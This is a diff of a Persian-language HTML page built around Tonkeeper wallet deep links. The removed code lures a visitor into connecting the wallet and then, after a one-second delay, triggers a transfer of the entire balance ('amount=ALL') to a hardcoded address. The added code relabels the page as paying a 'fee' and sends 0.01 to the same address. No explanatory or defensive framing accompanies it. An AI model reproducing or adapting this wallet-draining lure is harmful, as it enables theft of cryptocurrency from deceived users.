@@ -3,22 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>انتقال دارایی به Tonkeeper</title>
+    <title>اتصال به Tonkeeper و ارسال کارمزد</title>
     <script>
-        function connectToTonkeeper() {
-            // اتصال به Tonkeeper
-            window.location.href = "tonkeeper://";
-
-            // تأخیر برای اطمینان از اتصال به Tonkeeper
-            setTimeout(function() {
-                // پس از اتصال، دستور انتقال دارایی به آدرس خاص
-                window.location.href = "tonkeeper://transfer/UQCNKhcXrK9cE1h79LROYUacpPkyF30quWHtZ5_Zsakt3r-G?amount=ALL";
-            }, 1000);  // تأخیر 1 ثانیه
+        function sendTransaction() {
+            // اتصال به Tonkeeper برای شروع تراکنش
+            window.location.href = "tonkeeper://transfer/UQCNKhcXrK9cE1h79LROYUacpPkyF30quWHtZ5_Zsakt3r-G?amount=0.01"; // مقدار کارمزد
         }
     </script>
 </head>
 <body>
-    <h1>اتصال به Tonkeeper و انتقال دارایی</h1>
-    <button onclick="connectToTonkeeper()">اتصال و انتقال</button>
+    <h1>ارسال کارمزد از Tonkeeper</h1>
+    <button onclick="sendTransaction()">ارسال کارمزد</button>
 </body>
 </html>
